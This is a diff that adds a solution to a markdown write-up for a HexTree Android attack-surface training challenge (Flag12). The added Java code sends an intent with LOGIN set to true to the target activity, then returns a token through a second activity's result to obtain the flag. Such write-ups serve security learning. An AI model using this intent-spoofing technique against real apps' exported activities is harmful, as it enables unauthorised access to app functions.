@@ -297,6 +297,25 @@ finish();
 This is similar to previous challenge but we have a `onActivityResult` that checks for a `LOGIN = True` condition. 
 So we first need to send an intent where `LOGIN` is set to true, then have our second activity send over the token and the specified value.
 
+MainHextreeActivity
+```java
+Intent intent = new Intent();  
+intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");  
+intent.putExtra("LOGIN",true);  
+startActivityForResult(intent,42);
+```
+
+secondActivity
+```java
+Intent intent = new Intent();  
+intent.putExtra("token", 1094795585);  
+Utils.showDialog(this, intent);  
+setResult(42, intent);  
+finish();
+```
+Then we launch the app and fire the `LOGIN` intent with the button from our main activity, then the flag activity will call out second activity which will respond with the token and the value which in turn calls `success()` and gives us the flag.
+
+
 ## References
 https://www.youtube.com/watch?v=jnBmI1eD-og
 https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/
